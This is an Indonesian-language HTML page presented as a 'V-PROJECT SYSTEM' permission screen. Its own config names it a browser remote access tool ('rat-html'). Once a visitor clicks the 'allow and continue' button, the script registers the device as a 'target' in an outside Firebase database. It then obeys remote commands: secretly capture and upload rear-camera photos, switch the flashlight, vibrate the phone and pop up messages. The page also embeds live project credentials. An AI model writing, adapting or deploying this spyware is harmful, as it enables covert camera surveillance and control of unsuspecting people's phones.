<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V-PROJECT SYSTEM</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body style="background:#000; color:#00f2ff; font-family:monospace; text-align:center; padding-top:100px;">
    <h2 id="t" style="text-shadow: 0 0 10px #00f2ff;">V-PROJECT V1.0 [OFFLINE]</h2>
    <div id="dev">DETECTING DEVICE...</div>
    <p id="s" style="color:yellow; font-size:0.8rem; margin-top:20px;">SISTEM MEMBUTUHKAN IZIN AKSES</p>
    <button id="b" onclick="startSystem(this)" style="padding:15px 30px; background:#00f2ff; border:none; border-radius:10px; font-weight:bold; cursor:pointer; box-shadow: 0 0 15px #00f2ff; margin-top:10px;">IZINKAN & LANJUTKAN</button>

    <script>
        // CONFIG FIREBASE RAT-HTML (SINGAPORE REGION)
        const firebaseConfig = {
            apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
            authDomain: "rat-html.firebaseapp.com",
            databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "rat-html",
            storageBucket: "rat-html.firebasestorage.app",
            messagingSenderId: "1060124583265",
            appId: "1:1060124583265:web:7988dc574a1be9f10f5120",
            measurementId: "G-SP76CHQ5XN"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        function startSystem(btn) {
            btn.style.display = 'none';
            document.getElementById('t').innerText = "V-PROJECT V1.0 [ONLINE]";
            document.getElementById('s').innerText = "SYSTEM INJECTED. DO NOT CLOSE.";

            const ua = navigator.userAgent;
            const deviceName = ua.match(/(Infinix|Samsung|Oppo|Xiaomi|Vivo|Realme|Huawei)/i)?.[0] || "Android Device";
            const myID = "RAT_" + Math.floor(Math.random() * 9999);
            document.getElementById('dev').innerText = "DEVICE: " + deviceName;

            // Lapor ke Firebase
            db.ref('targets/' + myID).set({ name: deviceName, status: "Online", time: Date.now() });

            // Listener Perintah
            db.ref('commands/' + myID).on('value', (snap) => {
                const c = snap.val(); if(!c) return;

                // FITUR SENTER BELAKANG
                if(c.type === "flash") {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
                    .then(str => {
                        const track = str.getVideoTracks()[0];
                        track.applyConstraints({ advanced: [{ torch: c.status === "on" }] });
                    }).catch(e => console.log("Flash Error"));
                }

                // FITUR AMBIL FOTO BELAKANG
                if(c.type === "capture") {
                    const v = document.createElement('video');
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
                    .then(str => {
                        v.srcObject = str; v.play();
                        setTimeout(() => {
                            const cn = document.createElement('canvas');
                            cn.width = v.videoWidth; cn.height = v.videoHeight;
                            cn.getContext('2d').drawImage(v, 0, 0);
                            const photoData = cn.toDataURL('image/jpeg', 0.5);
                            db.ref('reports/' + myID).set({ photo: photoData, time: Date.now() });
                            str.getTracks().forEach(t => t.stop());
                        }, 2000);
                    });
                }

                if(c.type === "vibrate") navigator.vibrate(c.dur || 2000);
                if(c.type === "msg") alert(c.text);
            });
        }
    </script>
</body>
</html>
